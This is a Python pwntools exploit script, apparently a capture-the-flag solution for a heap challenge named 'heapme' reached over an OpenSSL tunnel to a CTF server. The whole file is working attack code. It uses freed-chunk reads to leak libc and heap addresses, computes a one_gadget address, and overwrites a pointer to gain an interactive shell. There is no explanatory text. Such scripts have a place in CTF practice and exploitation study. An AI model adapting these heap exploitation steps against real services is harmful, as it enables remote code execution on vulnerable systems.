#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import time
import os

context(arch='amd64')
p = 0
libc = 0
LOCAL = False
DEBUG = False

def wait(until):
    buf=p.recvuntil(until)
    if(DEBUG):
        print buf
    return buf

def start():
	global p,libc
	#p = process('./heapme',env={"LD_PRELOAD":"./libc-2.23.so"})
	#p = process('LD_PRELOAD=./libc-2.23.so strace -o out -vf ./heapme',shell=True)
	p=process('socat stdio openssl-connect:ctf.hexpresso.fr:4242,cert=client.pem,cafile=server.crt,verify=0',shell=True)
	libc = ELF('./libc-2.23.so')
	print wait("d: ")

def create(idx,size):
	p.sendline("0")
	wait("ze: ")
	p.sendline(str(size))
	wait("ex: ")
	p.sendline(str(idx))
	wait("d: ")


def read(idx):
	p.sendline("1")
	wait("ex: ")
	p.sendline(str(idx))
	return wait("d: ")


def write(idx,content):
	p.sendline("2")
	wait("ex: ")
	p.sendline(str(idx))
	wait("ta: ")
	p.sendline(content)
	wait("d: ")

def delete(idx):
	p.sendline("3")
	wait("ex: ")
	p.sendline(str(idx))
	wait("d: ")

def close():
	p.close()




DEBUG=False
start()
create(0,0x10)
create(1,0x10)
create(2,0x80)
delete(1)
delete(2)
create(3,0x10)

a=read(3)
leak=(u64((a.split(': ')[1].split('\n')[0]).ljust(8,'\x00')))
print hex(leak)
magic=leak-3951528+0xf1147
print(hex(magic))


create(4,0x10)
create(5,0x20)
delete(4)
delete(5)
create(6,0x10)
a=read(6)
leak=(u64((a.split(': ')[1].split('\n')[0]).ljust(8,'\x00')))
print hex(leak)
magic_ph=leak-0x30

create(7,0x10)
create(8,0x10)
create(9,0x10)

write(8,"b"*32+p64(magic_ph))
print(hex(magic_ph))

#wtf ?
write(0,"a"*36+'\x00'+'a'*0x3b+'-s\x00')
write(6,p64(magic))


p.sendline("1")
p.sendline(str(9))

p.interactive()

